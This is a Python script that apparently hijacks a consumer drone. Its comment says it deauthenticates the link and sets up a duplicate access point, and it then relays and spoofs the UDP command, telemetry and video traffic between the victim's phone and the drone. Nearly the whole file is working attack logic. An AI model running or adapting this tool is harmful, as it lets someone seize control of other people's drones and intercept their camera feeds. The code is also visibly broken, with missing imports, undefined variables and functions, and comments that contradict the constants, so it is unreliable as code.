import json
import os
import socket
import threading
import hijack

##################
### PREP MODULE ##
##################

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    scan_info = json.load(file)

target_info = scan_info.get("target_info", {})
target_mac = target_info.get("mac_address")
target_channel = target_info.get("channel")
target_ssid = target_info.get("raw_string")

options_info = scan_info.get("options", {})
packets = options_info.get("packets")
interface = options_info.get("interface")

# ── Config ────────────────────────────────────────────────────────────────────
AP_INTERFACE     = "wlx9cefd5f754df"
AP_INTERFACE_IP  = "192.168.10.1"

DRONE_INTERFACE  = "wlx9cefd5f66998"
DRONE_HOST       = "192.168.10.1"

CMD_PORT         = 8889
# STATE_PORT       = 8890
VIDEO_PORT       = 7797

# Spoofed IPs
SPOOF_SRC_TO_DRONE = "192.168.10.6"   # Drone sees this as the sender
SPOOF_DST_TO_PHONE = "192.168.10.3"   # Phone receives on this destination IP
# ─────────────────────────────────────────────────────────────────────────────

phone_addr = None
phone_lock = threading.Lock()


def send_raw(iface, src_ip, dst_ip, src_port, dst_port, data):
    """Craft and send a UDP packet with explicit src/dst IPs."""
    pkt = (
        IP(src=src_ip, dst=dst_ip) /
        UDP(sport=src_port, dport=dst_port) /
        Raw(load=data)
    )
    send(pkt, iface=iface, verbose=False)


def phone_to_drone():
    """
    Sniff commands from phone on Card 1, forward to drone via Card 2.
    Source IP spoofed to SPOOF_SRC_TO_DRONE (192.168.10.3).
    """
    global phone_addr

    def handle(pkt):
        global phone_addr
        if not (pkt.haslayer(IP) and pkt.haslayer(UDP)):
            return
        if pkt[UDP].dport != CMD_PORT:
            return

        src_ip   = pkt[IP].src
        src_port = pkt[UDP].sport
        payload  = bytes(pkt[UDP].payload)

        with phone_lock:
            if phone_addr != (src_ip, src_port):
                log.info(f"Phone address: {src_ip}:{src_port}")
                phone_addr = (src_ip, src_port)

        log.debug(f"[P→D cmd] spoofed src={SPOOF_SRC_TO_DRONE} → {DRONE_HOST}:{CMD_PORT} | {len(payload)}B")

        send_raw(
            iface=DRONE_INTERFACE,
            src_ip=SPOOF_SRC_TO_DRONE,  # fixed spoofed source
            dst_ip=DRONE_HOST,
            src_port=src_port,
            dst_port=CMD_PORT,
            data=payload
        )

    sniff(iface=AP_INTERFACE,
          filter=f"udp dst port {CMD_PORT}",
          prn=handle,
          store=False)


def drone_to_phone_cmd():
    """
    Sniff command responses from drone on Card 2, forward to phone via Card 1.
    Destination IP spoofed to SPOOF_DST_TO_PHONE (192.168.10.4).
    """
    def handle(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(UDP)):
            return
        if pkt[UDP].sport != CMD_PORT:
            return

        payload = bytes(pkt[UDP].payload)

        with phone_lock:
            target = phone_addr
        if target is None:
            log.warning("No phone yet, dropping cmd response")
            return

        _, phone_port = target
        log.debug(f"[D→P cmd] src={pkt[IP].src} → spoofed dst={SPOOF_DST_TO_PHONE}:{phone_port} | {len(payload)}B")

        send_raw(
            iface=AP_INTERFACE,
            src_ip=pkt[IP].src,         # drone's real IP as source
            dst_ip=SPOOF_DST_TO_PHONE,  # fixed spoofed destination
            src_port=CMD_PORT,
            dst_port=phone_port,
            data=payload
        )

    sniff(iface=DRONE_INTERFACE,
          filter=f"udp src port {CMD_PORT}",
          prn=handle,
          store=False)


def drone_video_to_phone():
    """
    Sniff video stream from drone on Card 2, forward to phone via Card 1.
    Destination IP spoofed to SPOOF_DST_TO_PHONE (192.168.10.4).
    """
    def handle(pkt):
        if not (pkt.haslayer(IP) and pkt.haslayer(UDP)):
            return
        if pkt[UDP].dport != VIDEO_PORT:
            return

        payload = bytes(pkt[UDP].payload)

        with phone_lock:
            target = phone_addr
        if target is None:
            return

        log.debug(f"[D→P video] src={pkt[IP].src} → spoofed dst={SPOOF_DST_TO_PHONE}:{VIDEO_PORT} | {len(payload)}B")

        send_raw(
            iface=AP_INTERFACE,
            src_ip=pkt[IP].src,         # drone's real IP as source
            dst_ip=SPOOF_DST_TO_PHONE,  # fixed spoofed destination
            src_port=VIDEO_PORT,
            dst_port=VIDEO_PORT,
            data=payload
        )

    sniff(iface=DRONE_INTERFACE,
          filter=f"udp dst port {VIDEO_PORT}",
          prn=handle,
          store=False)


def drone_state_to_phone():
    """
    Telemetry (8890): plain socket relay, destination spoofed to
    SPOOF_DST_TO_PHONE via send_raw.
    """
    import socket
    state_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    state_sock.setsockopt(socket.SOL_SOCKET, 25, DRONE_INTERFACE.encode() + b'\0')
    state_sock.bind(("0.0.0.0", STATE_PORT))

    while True:
        data, addr = video_sock.recvfrom(65536)   # larger buffer for video
        with phone_lock:
            target = phone_addr
        if target is None:
            continue
        phone_video_sock.sendto(data, (target[0], DRONE_VIDEO_PORT))
        # Video is high-bandwidth — skip per-packet logging


# Run the hijack program to deauth, set up the duplcate AP, and connect to the target network
hijack(interface, target_mac, target_channel, packets, target_ssid)

# ── Start threads ─────────────────────────────────────────────────────────────
threading.Thread(target=phone_to_drone,      daemon=True).start()
threading.Thread(target=drone_to_phone,      daemon=True).start()
threading.Thread(target=drone_state_to_phone, daemon=True).start()
threading.Thread(target=drone_video_to_phone, daemon=True).start()

log.info(f"Relay active | spoof src→drone={SPOOF_SRC_TO_DRONE} | spoof dst→phone={SPOOF_DST_TO_PHONE}")
log.info(f"Ports -- cmd:{CMD_PORT}  state:{STATE_PORT}  video:{VIDEO_PORT}")
threading.Event().wait()
